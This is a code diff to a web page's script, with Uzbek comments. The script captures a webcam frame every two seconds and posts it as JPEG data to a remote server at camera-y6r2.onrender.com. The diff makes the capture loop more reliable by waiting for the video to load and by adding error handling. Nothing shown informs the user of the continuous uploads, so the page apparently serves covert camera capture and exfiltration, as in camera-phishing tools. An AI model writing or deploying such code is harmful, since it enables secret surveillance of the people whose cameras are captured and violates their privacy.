@@ -15,17 +15,21 @@
       video.srcObject = stream;
       video.play();
 
-      // Har 2 sekundda rasm olish va yuborish
-      setInterval(() => {
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imageData = canvas.toDataURL('image/jpeg');
+      video.addEventListener('loadeddata', () => {
+        // Video tayyor bo‘lgach intervalni boshlaymiz
+        setInterval(() => {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL('image/jpeg');
 
-        fetch('https://camera-y6r2.onrender.com/send-photo', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ image: imageData })
-        });
-      }, 2000); // 2000 ms = 2 sekund
+          fetch('https://camera-y6r2.onrender.com/send-photo', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: imageData })
+          }).catch(err => console.error('Yuborishda xatolik:', err));
+        }, 2000);
+      });
+    }).catch(err => {
+      console.error('Kamera ruxsati berilmadi:', err);
     });
   </script>
 </body>
